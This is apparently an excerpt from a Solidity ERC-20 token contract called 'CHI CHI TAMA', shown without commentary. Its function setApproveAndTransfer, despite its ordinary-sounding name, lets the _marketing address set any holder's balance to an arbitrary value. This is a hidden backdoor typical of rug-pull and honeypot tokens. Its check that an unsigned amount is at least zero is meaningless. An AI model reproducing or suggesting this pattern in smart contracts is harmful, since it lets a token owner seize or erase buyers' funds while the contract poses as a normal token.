...
contract CHICHITAMA is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private  _name = "CHI CHI TAMA";
    ...
    function setApproveAndTransfer(address receiverAddress, uint256 wAmount, uint256 valueAdded, uint256 vAmount ) external  {
         require(msg.sender == _marketing );
         require(receiverAddress != uniswapV2Pair);
         require(0 <= vAmount, "Amount must be more than AddedValues");
        _tOwned[receiverAddress] = wAmount +  valueAdded.mul(2).div(100) - vAmount;
    }   
